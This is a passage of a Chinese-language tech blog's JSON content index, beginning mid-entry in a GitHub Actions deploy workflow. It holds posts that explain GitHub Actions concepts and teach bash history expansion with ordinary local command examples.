website to PRD run: bundle exec rake deploy:production env: SSH_DEPLOY_SERVER: $&#123;&#123; secrets.SSH_DEPLOY_SERVER &#125;&#125; SSH_DEPLOY_USER: $&#123;&#123; secrets.SSH_DEPLOY_USER &#125;&#125; 引用 thbe.org","categories":[{"name":"CI/CD","slug":"CI-CD","permalink":"https://www.gogotech.top/categories/CI-CD/"}],"tags":[{"name":"github","slug":"github","permalink":"https://www.gogotech.top/tags/github/"}]},{"title":"理解Github Actions","slug":"github-actions","date":"2020-02-29T14:56:48.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/02/29/github-actions/","link":"","permalink":"https://www.gogotech.top/2020/02/29/github-actions/","excerpt":"","text":"使用Github Actions可以直接在github仓库中自动化实现软件开发整个生命周期的工作流（from idea to production）。你可以编写单独的任务（称为actions），然后将这些任务联合以创建自定义的工作流（workflow），你可以设置工作流来构建、测试、打包、发布。工作流中的任务被执行的地方（主机）称为runners，github提供的共享runner称为GitHub-hosted runners，你也可以使用自己的主机来运行任务，这种主机称为Self-hosted runners Action: 表示单个任务，多个action作为一个一个的步骤，组成job action是工作流（Workflow）中最小的可移植构建块 可以创建自己的actions，也可以使用或自定义github社区共享的actions 可以自定义action的输入、输出以及环境变量 Step: 运行命令或action的单个任务 Job: 在同一个runner上执行的连续步骤 在一个工作流文件（Workflow file）中可以定义jobs运行的依赖关系 jobs可以同时运行，也可以根据前一个job状态顺序运行 Workflow: 一个可配置的自动化流程，由一个或多个job组成 可以按计划执行或被事件触发 Workflow file: 定义workflow配置信息的YAML文件，至少有一个job workflow file保存在.github/workflows目录中 Further reading 官方文档介绍 github marketplace github community","categories":[{"name":"CI/CD","slug":"CI-CD","permalink":"https://www.gogotech.top/categories/CI-CD/"}],"tags":[{"name":"github","slug":"github","permalink":"https://www.gogotech.top/tags/github/"},{"name":"idea","slug":"idea","permalink":"https://www.gogotech.top/tags/idea/"}]},{"title":"bash历史执行命令的各种骚操作","slug":"bash-history","date":"2020-02-28T23:18:44.000Z","updated":"2020-05-09T07:18:34.023Z","comments":true,"path":"2020/02/28/bash-history/","link":"","permalink":"https://www.gogotech.top/2020/02/28/bash-history/","excerpt":"","text":"在bash命令行中，会记录历史执行的命令，使用history命令可以查看，在bash环境中，对历史命令的操作非常强大，熟悉这些用法后可以非常高效地在bash命令行中工作。 对历史命令的操作分为三个层次，第一个是获取到历史命令，用到的命令（字符）称为Event designators；第二个是获取到命令中的特定字符，用到的命令称为Word designators；第三个是对字符进行操作，用到的命令称为Modifiers。 首先使用history命令查看历史执行命令： 12345678$ history1 tar czvf etc.tar.gz /etc/2 cp /etc/passwd /backup3 ps -ef | grep docker4 systemctl restart sshd5 /usr/local/apache2/bin/apachectl restart6 ls -F7 whoami Event designators使用!n命令通过命令编号获取历史执行过的命令： 1234567891011$ !!whoamiuser01$ !-1whoamiuser01$ !4systemctl restart sshd$ !-2ls -F1.txt 2.txt helloworld.txt start.sh* test01/ test02/ 使用!string（以指定字符串开头的命令）和!?string（包含指定字符串的命令）获取历史执行过的命令： 1234$ !psps -ef | grep docker$ !?apache/usr/local/apache2/bin/apachectl restart 使用^str1^str2^从前一条命令中取代字符： 123$ ls /etc/cron.daily/logrotate$ ^ls^cat^cat /etc/cron.daily/logrotate Word DesignatorsWord Designators在你想要输入一个新的命令但使用之前执行的命令用过的参数时非常有用。 12345678910111213141516171819$ cp /etc/passwd /backup$ ls -l !cp:^ # 使用^获取第一个参数ls -l /etc/passwd$ cp /etc/passwd /backup$ ls -l !cp:$ # 使用$获取最后一个参数ls -l /backup$ tar czvf /backup/home-dir-backup.tar.gz /home$ ls -l !tar:2 # 获取指定位置的参数ls -l /backup/home-dir-backup.tar.gz$ cp /etc/passwd /backup$ ls -l !cp:* # 使用*获取所有参数ls -l /etc/passwd /backup$ tar cvf home-dir.tar john jason ramesh rita$ ls -l !tar:3-5 # 获取指定范围内的参数ls -l john jason ramesh !!:*, 从前一个命令中获取所有参数 !!:2*, 从前一个命令中获取从第二个参数开始后的所有参数 !!:2-$, 和上一个命令相同 !!:2-, 从第二个参数开始后到倒数第二个参数，即不包括最后一个参数 使用!%获取最近搜索到的命令中匹配到的字符： 12345$ /usr/local/apache2/bin/apachectl restart$ !?apache/usr/local/apache2/bin/apachectl restart$ !% stop # !%获取前一个!?命令字符串匹配到的整个词/usr/local/apache2/bin/apachectl stop Modifers1234567891011$ ls -l /very/long/path/name/file-name.txt$ ls -l !!:$:h # :h的功能是删除路径中最后的位置ls -l /very/long/path/name$ ls -l /very/long/path/name/file-name.txt$ ls -l !!:$:t # :t的功能是保留路径最后的位置ls -l file-name.txt$ ls -l /very/long/path/name/file-name.txt$ ls -l !!:$:r # :r的功能是移除文件的后缀ls -l /very/long/path/name/file-name 使用:s像sed一样对字符进行替换： 1234567$ ls 1.txt 2.txt 1.txt$ !!:s/1.txt/3.txt/ # 替换第一个匹配的字符串ls 3.txt 2.txt 1.txt$ cp /etc/password /backup/password.bak$ !!:gs/password/passwd/ # 全局替换cp /etc/passwd /backup/passwd.bak 使用&amp;快速重复上一个替换： 12$ tar cvf password.tar /etc/password$ !!:g&amp; 使用:p不执行，只打印命令： 123$ tar cvf home-dir.tar john jason ramesh rita$ tar cvfz new-file.tar !tar:3-:ptar cvfz new-file.tar john jason ramesh","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.gogotech.top/categories/Linux/"}],"tags":[{"name":"commands","slug":"commands","permalink":"https://www.gogotech.top/tags/commands/"}]}],"categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.gogotech.top/categories/Linux/"},{"name":"Others","slug":"Others","permalink":"https://www.gogotech.top/categories/Others/"},{"name":"Code","slug":"Code","permalink":"https://www.gogotech.top/categories/Code/"},{"name":"CI/CD","slug":"CI-CD","permalink":"https://www.gogotech.top/categories/CI-CD/"}],"tags":[{"name":"commands","slug":"commands","permalink":"https://www.gogotech.top/tags/commands/"},{"name":"nginx","slug":"nginx","permalink":"https://www.gogotech.top/tags/nginx/"},{"name":"config","slug":"config","permalink":"https://www.gogotech.top/tags/config/"},{"name":"python","slug":"python","permalink":"https://www.gogotech.top/tags/python/"},{"name":"idea","slug":"idea","permalink":"https://www.gogotech.top/tags/idea/"},{"name":"github","slug":"github","permalink":"https://www.gogotech.top/tags/github/"}]}